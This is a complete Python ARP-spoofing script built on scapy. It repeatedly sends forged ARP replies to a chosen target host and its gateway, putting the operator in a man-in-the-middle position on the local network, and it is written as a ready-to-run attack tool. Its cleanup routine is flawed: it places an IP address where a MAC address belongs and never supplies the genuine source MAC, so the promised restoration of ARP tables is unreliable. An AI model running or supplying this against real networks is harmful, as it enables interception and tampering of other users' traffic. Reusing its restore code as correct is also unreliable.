#!/bin/python3

from scapy.all import ARP, Ether, send, getmacbyip, get_if_hwaddr
import argparse
import time
import sys
import os

def parse_arguments():
    parser = argparse.ArgumentParser(description="This is my ArpSpoofer")
    parser.add_argument("-i", "--interface", dest="interface", required=True, help="Set the interface")
    parser.add_argument("-t", "--target", dest="target", required=True, help="Set a target IP address")
    parser.add_argument("-g", "--gateway", dest="gateway", required=True, help="Set a gateway IP address")
    parser.add_argument("-s", "--sleep", dest="sleep", type=int, default=2, help="Set sleep time in seconds")
    parser.add_argument("-v", "--verbose", dest="verbose", action="store_true", help="Enable verbose output")
    return parser.parse_args()

def spoofing(target_ip: str, spoof_ip: str, verb=False):
    target_mac = getmacbyip(target_ip)
    if target_mac is None:
        print(f"[-] Could not find mac address to IP address: {target_ip}")
        return

    spoof_mac = getmacbyip(spoof_ip)
    if spoof_mac is None:
        print(f"[-] Could not find mac address to IP address: {spoof_ip}")
        return  

    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)
    if verb:
        print(f"[+] Send ARP response: {spoof_ip} is-at {target_mac} to {target_ip}")

def restore(destination_ip, source_ip, verb=False):
    destination_mac = getmacbyip(destination_ip)
    if destination_mac is None:
        print(f"Could not find mac address to destination/source IP address")
        return

    source_mac = getmacbyip(source_ip)
    if source_mac is None:
        print(f"Could not find mac address to destination/source IP address")
        return

    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_ip, psrc=source_ip)
    send(packet, verbose=False)
    if verb:
        print(f"[+] Restored ARP entry for {destination_ip} to {source_ip}")

def main():
    args = parse_arguments()

    interface = args.interface
    target_ip = args.target
    gateway_ip = args.gateway
    pause = args.sleep
    verb = args.verbose
    
    try:
        print(f"[+] Start of ArpSpoofing on interface {interface}")
        while True:
            spoofing(target_ip, gateway_ip, verb)
            spoofing(gateway_ip, target_ip, verb)
            time.sleep(pause)
    except KeyboardInterrupt:
        print("\n[+] Interruped by user")
        time.sleep(2)
        print("[+] Recovering ARP tables ...")
        restore(target_ip, gateway_ip, verb)
        restore(gateway_ip, target_ip, verb)
        print("[+] ARP tables recovered.Exit...")

if __name__ == "__main__":
    main()
